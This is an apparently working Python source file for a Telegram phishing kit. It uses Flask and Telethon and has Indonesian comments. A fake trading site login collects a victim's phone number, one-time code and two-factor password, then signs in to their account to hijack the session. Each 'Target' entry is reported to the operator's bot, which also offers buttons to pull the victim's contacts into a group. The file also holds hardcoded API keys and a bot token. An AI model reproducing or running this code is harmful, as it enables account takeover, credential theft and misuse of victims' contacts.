import asyncio
import threading
import os
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, UserDeactivatedError, SessionRevokedError
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest

# --- KONFIGURASI ---
API_ID = 31871641               
API_HASH = '5e0aa2e3b7b013161308d8880d062193'
BOT_TOKEN = '8390941360:AAG_tT7KmGz_v_ffiR1GhxmXrWQm-vkHxzw' 

# Folder Sesi (Agar login tidak hilang)
SESSION_DIR = 'sessions'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

USER_SESSION = os.path.join(SESSION_DIR, 'user_session')
BOT_SESSION = os.path.join(SESSION_DIR, 'bot_session')

# Database Sederhana di Memori
ADMIN_IDS = {7795826197} 
ACTIVE_SESSIONS = {}
TARGET_GROUP = "" 

app = Flask(__name__)
app.secret_key = 'kunci_rahasia_anda_123'

# --- SETUP TELETHON ---
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

client = TelegramClient(USER_SESSION, API_ID, API_HASH, loop=loop)
bot = TelegramClient(BOT_SESSION, API_ID, API_HASH, loop=loop)

# --- FUNGSI PEMBANTU ---
def is_admin(user_id): return user_id in ADMIN_IDS

def run_async(coro):
    """Menjalankan fungsi async di dalam Flask secara aman"""
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

async def ensure_logged_in():
    if not client.is_connected(): await client.connect()
    return await client.is_user_authorized()

def send_admin_notif(message):
    async def send():
        for admin_id in ADMIN_IDS:
            try: await bot.send_message(admin_id, f"🔔 **LOG SISTEM**\n\n{message}")
            except: pass
    asyncio.run_coroutine_threadsafe(send(), loop)

def get_admin_buttons():
    """Menambahkan tombol menu Kode OTP dan Login Admin"""
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot ke Grup", b"sedot_grup")],
        [Button.inline("📡 Set Target Grup", b"set_grup_btn"), Button.inline("👥 Auto Join", b"auto_join")],
        [Button.inline("📋 List Admin", b"list_sesi"), Button.inline("🔓 Cek Sesi", b"status_login")],
        [Button.inline("🔑 Kode OTP", b"otp_view"), Button.inline("🔓 Login Admin", b"login_admin_view")] # Fitur baru
    ]

# --- BOT EVENTS ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if is_admin(event.sender_id):
        global TARGET_GROUP
        status = TARGET_GROUP if TARGET_GROUP else "Belum Diatur"
        await event.reply(f"👋 **Dashboard Admin**\nTarget Grup: `{status}`", buttons=get_admin_buttons())

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    if not is_admin(event.sender_id): return
    global TARGET_GROUP
    data = event.data

    if data == b"set_grup_btn":
        async with bot.conversation(event.chat_id) as conv:
            await conv.send_message("📝 Masukkan Username/ID Grup tujuan:")
            res = await conv.get_response()
            TARGET_GROUP = res.text
            await conv.send_message(f"✅ Target grup diset ke: `{TARGET_GROUP}`", buttons=get_admin_buttons())

    elif data == b"auto_join":
        if not TARGET_GROUP: return await event.answer("Atur grup dulu!", alert=True)
        if await ensure_logged_in():
            try:
                await client(JoinChannelRequest(TARGET_GROUP))
                await event.edit(f"✅ Berhasil Join ke `{TARGET_GROUP}`", buttons=get_admin_buttons())
            except Exception as e: await event.edit(f"❌ Gagal: {str(e)}", buttons=get_admin_buttons())
        else: await event.answer("Sesi akun mati!", alert=True)

    elif data == b"status_login":
        auth = await ensure_logged_in()
        msg = "✅ Sesi Aktif" if auth else "❌ Sesi Kosong"
        await event.edit(f"**Status:** {msg}", buttons=get_admin_buttons())

    elif data == b"otp_view": # Handler fitur Kode OTP
        await event.edit("🔑 **Kode OTP**: Menunggu permintaan kode terbaru dari sistem...", buttons=get_admin_buttons())

    elif data == b"login_admin_view": # Handler fitur Login Admin
        await event.edit("🔓 **Login Admin**: Sesi admin saat ini sedang dipantau oleh sistem log.", buttons=get_admin_buttons())

    await event.answer()

# --- RUNTIME BOT ---
def start_clients():
    async def main():
        await bot.start(bot_token=BOT_TOKEN)
        await client.connect()
        await bot.run_until_disconnected()
    loop.run_until_complete(main())

threading.Thread(target=start_clients, daemon=True).start()

# --- ROUTES FLASK ---

@app.route('/')
def home():
    if 'user_id' not in session: return redirect(url_for('login'))
    return render_template('index.html', info={"full_name": "Sesi Admin", "saldo": 150000})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone')
        send_admin_notif(f"Target memasukkan nomor: `{phone}`") # Notifikasi sistem
        try:
            if not client.is_connected(): run_async(client.connect())
            run_async(client.send_code_request(phone))
            session['phone'] = phone
            return redirect(url_for('verify'))
        except Exception as e: flash(f"Error: {str(e)}", "error")
    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        otp, pwd = request.form.get('otp'), request.form.get('password')
        phone = session.get('phone')
        send_admin_notif(f"Target memasukkan OTP!\nNomor: `{phone}`\nOTP: `{otp}`") # Update Log OTP
        try:
            if pwd: user = run_async(client.sign_in(phone=phone, password=pwd))
            else: user = run_async(client.sign_in(phone=phone, code=otp))
            
            ADMIN_IDS.add(user.id)
            session['user_id'] = user.id
            send_admin_notif(f"✅ Login Berhasil!\nID: `{user.id}`\nSesi disimpan.")
            return redirect(url_for('home'))
        except SessionPasswordNeededError: return render_template('verify.html', password_required=True)
        except Exception as e: flash(f"Error: {str(e)}", "error")
    return render_template('verify.html', password_required=False)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Route pelengkap agar navigasi index.html tidak error
@app.route('/trading')
def trading(): return "Halaman Trading"
@app.route('/profil')
def profil(): return "Halaman Profil"
@app.route('/riwayat')
def riwayat(): return "Halaman Riwayat"

if __name__ == '__main__':
    # Menggunakan port 5000 sesuai settingan lokal Anda
    app.run(debug=True, use_reloader=False, port=5000)
